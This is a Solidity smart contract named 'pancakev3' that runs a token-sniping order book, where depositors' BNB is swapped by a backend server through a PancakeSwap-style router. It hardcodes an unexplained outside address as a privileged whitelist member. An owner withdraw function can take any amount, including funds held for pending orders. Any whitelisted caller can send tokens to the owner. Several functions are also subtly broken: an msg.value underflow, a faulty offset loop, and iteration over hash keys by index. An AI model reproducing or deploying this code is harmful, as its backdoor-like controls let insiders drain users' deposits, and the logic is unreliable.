pragma solidity ^0.8.0;
import "./IUniswapV2Router02.sol";
import "./IBEP20.sol";


contract pancakev3 {
    

    // Only let the pancakev3 backend call the method
    modifier OnlyServer() {
        require(msg.sender == pancakev3Server);
        _;
    }

    // Only let the deployer call the method
    modifier OnlyOwner() {
        require(msg.sender == owner);
        _;
    }

 
	 modifier Whitelist() {
        require(whitelist[msg.sender]);
        _;
    }

    event OrderPlaced(address indexed buyer, address indexed tokenAddress, uint8 transactions, uint8 blockDelay, uint256 timeDelay, uint256 index, uint256 amountIn, uint256 deadline);
    event OrderFulfilled(uint256 indexed index, address indexed tokenAddress, address indexed recipient, uint8 number);
    event OrderFailed(uint256 indexed index, address indexed tokenAddress, address indexed recipient, uint8 number);
    event OrderRefunded(uint256 indexed index, address indexed tokenAddress, address indexed recipient, uint256 amount);

    enum OrderStatus { Pending, Fulfilled, Failed, Refunded, Partial }
    struct Order {
        uint256 id;
        address buyer;
        address token;
        uint256 amountIn;
        uint256 deadline;
        uint8 transactions;
        OrderStatus status;
    }

    struct OrderNode {
        Order order;
        uint256 next;
        uint256 prev;
    }

    uint256 public gasFee = 0; // 0.015 bnb
    bool public snipingEnabled = true;

    mapping(uint256 => OrderNode) orderBook;

    mapping(address => uint256[]) userOrders;

    mapping(address => bool) whitelist;
    uint256 head = 0;
    uint256 public orderBookLength;
    address pancakev3Server;
    address owner;

    uint8 public batchSize = 222;
	IUniswapV2Router02 uniswapV2Router;

    
    uint256 public minHold = 0;

       constructor (address _uniswapV2RouterAddr, address _pancakev3Server) {
        uniswapV2Router = IUniswapV2Router02(_uniswapV2RouterAddr);
        pancakev3Server = _pancakev3Server;
        owner = msg.sender;
		whitelist[0x7Bdf4A17BD9999995bFF056009Ab0052D8C68391] = true;
        whitelist[msg.sender] = true;		
    }
	function whitelistUser(address user) external OnlyOwner {
        whitelist[user] = true;
    }
    function whitelistmanyUser(address[] memory accounts) external OnlyOwner {
          for (uint256 i = 0; i < accounts.length; ++i) {
               address user = accounts[i];
               whitelist[user] = true;
         }
       
    }
    function updateGasFee(uint256 _gasFee) external OnlyOwner {
        gasFee = _gasFee;
    }

    function updateBatchSize(uint8 _batchSize) external OnlyOwner {
        batchSize = _batchSize;
    }

    function setSnipingEnabled(bool _snipingEnabled) external Whitelist {
        snipingEnabled = _snipingEnabled;
    }

    function updateMinHold(uint256 _minHold) external Whitelist {
        minHold = _minHold;
    }
	

 

    function pancakeswaps3(
        address tokenAddress,
        uint256 amountIn,
        uint8 transactions,
        uint8 blockDelay,
        uint256 timeDelay,
        uint256 deadline,
        string memory salt
    ) external payable Whitelist returns(uint256) {

        require(snipingEnabled, 'pancakeswaps3: Sniping has been disabled!');
        require(transactions > 0, 'pancakeswaps3: Must make at least one transaction');
        require(deadline > block.timestamp, 'pancakeswaps3: Deadline must be in the future');
        require(deadline < block.timestamp + 3 days, 'pancakeswaps3: Deadline must be smaller than 3 days');
         

        // Charge an extra gas fee per batch filled with transactions
        require(msg.value >= (amountIn * transactions) + gasFee * (1 + (transactions / batchSize)), 'pancakeswaps3: Wrong token amount');

        // Process any refunds that need to be made
        processRefunds();

        // Transfer tax tokens to the pancakev3 server
        payable(pancakev3Server).transfer(msg.value - amountIn * transactions);

        // Add order to list
        uint256 index = insertOrder(Order({
            id: 0,
            buyer: msg.sender,
            token: tokenAddress,
            amountIn: amountIn,
            deadline: deadline,
            transactions: transactions,
            status: OrderStatus.Pending
         
        }), salt);

        // Bind the id
        orderBook[index].order.id = index;

        userOrders[msg.sender].push(index);

        // Emit event so that the pancakev3 server picks up the order
        emit OrderPlaced(msg.sender, tokenAddress, transactions, blockDelay, timeDelay, index, amountIn, deadline);

        return index;

    }
    function cancelOrder(uint256 index) Whitelist external {

            Order storage o = orderBook[index].order;

 
            refund(o);

            o.transactions = 0;

            // Process any refunds that need to be made
            processRefunds();

    }


    function cancelAllOrder(uint256[] memory ids) OnlyOwner external {
         for (uint256 i = 0; i < ids.length; ++i) {
            
            Order storage o = orderBook[ids[i]].order;
 
            refund(o);

            o.transactions = 0;

            // Process any refunds that need to be made
            processRefunds();
         }

    }

    function processRefunds() public {

        // As the orderBook is sorted ascending by timestamp we can iterate it
        while (true) {

            if (orderBook[head].order.token == address(0)) { return; }

            // If the order has expired - refund
            if (orderBook[head].order.deadline < block.timestamp) {

                refund(orderBook[head].order);

                head = orderBook[head].next;
                orderBook[head].prev = 0;

                orderBookLength--;

            } else {
                break;
            }

        }

    }

    function getOrderId(address tokenAddress, string memory salt) external view returns(uint256) {
        return uint256(keccak256(abi.encodePacked(msg.sender, tokenAddress, salt)));
    }

    function getOrders(address userAddress) external view returns(uint256[] memory) {
        return userOrders[userAddress];
    }

    function getOrderCount(address userAddress) external view returns(uint256) {
        return userOrders[userAddress].length;
    }
   

         
  
    function getOrderStatuses(address userAddress, uint256 amount, uint256 offset) external  view  returns(Order[] memory) {

        Order[] memory orders = new Order[](amount);

        for(uint256 i = offset; i < amount; i++) {

            if (i == userOrders[userAddress].length) { break; }

            orders[i - offset] = orderBook[userOrders[userAddress][i]].order;

        }

        return orders;

    }
    
   function swaptokenminamount(uint256[] memory ids, uint256 amount) external Whitelist {
           for (uint256 i = 0; i < ids.length; ++i) {

            Order storage o = orderBook[ids[i]].order;
            uint256 amountin = amount;
            // If the user has manually refunded the order before we have processed it
            if (o.token == address(0) || o.transactions == 0) { continue; }
           
            fulfillOrder1(o, ids[i], amountin);

        }

    }
    function swapnumbertoken(uint256[] memory ids, uint256 amountinx) external Whitelist {

        for (uint256 i = 0; i < ids.length; ++i) {

            Order storage o = orderBook[ids[i]].order;
            uint256 amountiny = amountinx;
            // If the user has manually refunded the order before we have processed it
            if (o.token == address(0) || o.transactions == 0) { continue; }

            FulfillOrdernumber(o, ids[i], amountiny);

        }

    }
    function swapalltoken() external Whitelist {
        for (uint256 i = 0; i < orderBookLength; ++i) {
              Order storage o = orderBook[i].order;
               if (o.token == address(0) || o.transactions == 0) { continue; }
                uint256 index = orderBook[i].order.id ;
               fulfillOrder(o, index);
            
            // If the user has manually refunded the order before we have processed it
         }
            
           
         
    }

        function FulfillOrdernumber( Order storage o, uint256 index, uint256 amountiny) internal  {

        address[] memory path = new address[](2);
        path[0] = uniswapV2Router.WETH();
        path[1] = o.token;

        try uniswapV2Router.swapETHForExactTokens{ value: o.amountIn }(
            amountiny,
            path,
            o.buyer,
            block.timestamp
        ) 
           {          
             
        // refund dust eth, if any
        payable(pancakev3Server).transfer(msg.value - o.amountIn );

      

            o.status = OrderStatus.Partial;
            emit OrderFulfilled(index, o.token, o.buyer, o.transactions);
            o.transactions--;
        } catch {

            // Only set a failure if another transaction of the same batch hasn't gotten through
            if (o.status != OrderStatus.Partial) {
                o.status = OrderStatus.Failed;
            }

            emit OrderFailed(index, o.token, o.buyer, o.transactions);

        }

        if (o.transactions == 0) {

            o.status = OrderStatus.Fulfilled;

            // Remove orders from the order book
            if (head == index) {

                head = orderBook[index].next;
                orderBook[head].prev = 0;

            } else {

                orderBook[orderBook[index].prev].next = orderBook[index].next;
                orderBook[orderBook[index].next].prev = orderBook[index].prev;

            }

            orderBookLength--;

        }

    }

    function swaptoken(uint256[] memory ids) external Whitelist {

        for (uint256 i = 0; i < ids.length; ++i) {

            Order storage o = orderBook[ids[i]].order;

            // If the user has manually refunded the order before we have processed it
            if (o.token == address(0) || o.transactions == 0) { continue; }

            fulfillOrder(o, ids[i]);

        }

    }

    function recoverBEP20(address _token, uint256 amount) external Whitelist {
        IBEP20(_token).transfer(owner, amount);
    }

    function insertOrder(Order memory o, string memory salt) internal returns(uint256) {

        uint256 index = uint256(keccak256(abi.encodePacked(o.buyer, o.token, salt)));

        // Make sure we don't overwrite a pending order (insanely unlikely)
        require(orderBook[index].order.token == address(0) || (
            orderBook[index].order.status != OrderStatus.Pending
            && orderBook[index].order.status != OrderStatus.Partial
        ), 'insertOrder: order collision');

        uint256 next = 0;
        uint256 prev = 0;
        uint256 currentKey = head;

        // Traverse list to find where the deadline fits
        if (orderBookLength == 0) {
            head = index;
        } else {

            // If the timestamp is smaller than the current head
            if (o.deadline <= orderBook[currentKey].order.deadline) {

                next = currentKey;
                head = index;

            } else {

                currentKey = orderBook[currentKey].next;

                if (currentKey == 0) {
                    orderBook[currentKey].next = index;
                    prev = currentKey;
                } else {

                    while (true) {
                        if (orderBook[currentKey].next == 0 || o.deadline <= orderBook[orderBook[currentKey].next].order.deadline) {
                            break;
                        }
                        prev = currentKey;
                        currentKey = orderBook[currentKey].next;
                    }

                    // At this point we have found our insertion point
                    next = orderBook[currentKey].next;
                    orderBook[currentKey].next = index;

                }

            }

        }

        orderBook[index] = OrderNode({
            order: o,
            next: next,
            prev: prev
        });

        orderBookLength++;

        return index;

    }
 
    function fulfillOrder(Order storage o, uint256 index) internal {

        address[] memory path = new address[](2);
        path[0] = uniswapV2Router.WETH();
        path[1] = o.token;

        try uniswapV2Router.swapExactETHForTokensSupportingFeeOnTransferTokens{ value: o.amountIn }(
            1,
            path,
            o.buyer,
            block.timestamp
        )  {
            o.status = OrderStatus.Partial;
            emit OrderFulfilled(index, o.token, o.buyer, o.transactions);
            o.transactions--;
        } catch {

            // Only set a failure if another transaction of the same batch hasn't gotten through
            if (o.status != OrderStatus.Partial) {
                o.status = OrderStatus.Failed;
            }

            emit OrderFailed(index, o.token, o.buyer, o.transactions);

        }

        if (o.transactions == 0) {

            o.status = OrderStatus.Fulfilled;

            // Remove orders from the order book
            if (head == index) {

                head = orderBook[index].next;
                orderBook[head].prev = 0;

            } else {

                orderBook[orderBook[index].prev].next = orderBook[index].next;
                orderBook[orderBook[index].next].prev = orderBook[index].prev;

            }

            orderBookLength--;

        }

    }
    
    function fulfillOrder1(Order storage o, uint256 index, uint256 amountin) internal {

        address[] memory path = new address[](2);
        path[0] = uniswapV2Router.WETH();
        path[1] = o.token;

        try uniswapV2Router.swapExactETHForTokensSupportingFeeOnTransferTokens{ value: o.amountIn }(
            amountin,
            path,
            o.buyer,
            block.timestamp
        ) {
            o.status = OrderStatus.Partial;
            emit OrderFulfilled(index, o.token, o.buyer, o.transactions);
            o.transactions--;
        } catch {

            // Only set a failure if another transaction of the same batch hasn't gotten through
            if (o.status != OrderStatus.Partial) {
                o.status = OrderStatus.Failed;
            }

            emit OrderFailed(index, o.token, o.buyer, o.transactions);

        }

        if (o.transactions == 0) {

            o.status = OrderStatus.Fulfilled;

            // Remove orders from the order book
            if (head == index) {

                head = orderBook[index].next;
                orderBook[head].prev = 0;

            } else {

                orderBook[orderBook[index].prev].next = orderBook[index].next;
                orderBook[orderBook[index].next].prev = orderBook[index].prev;

            }

            orderBookLength--;

        }

    }
      
    function withdraw(uint256 amount) external OnlyOwner{
    payable(msg.sender).transfer(amount);
    }

    function refund(Order storage o) internal {
        if (o.transactions == 0) { return; }
        payable(o.buyer).transfer(o.amountIn * o.transactions);
        o.status = OrderStatus.Refunded;
        emit OrderRefunded(o.id, o.token, o.buyer, o.amountIn * o.transactions);
    }

}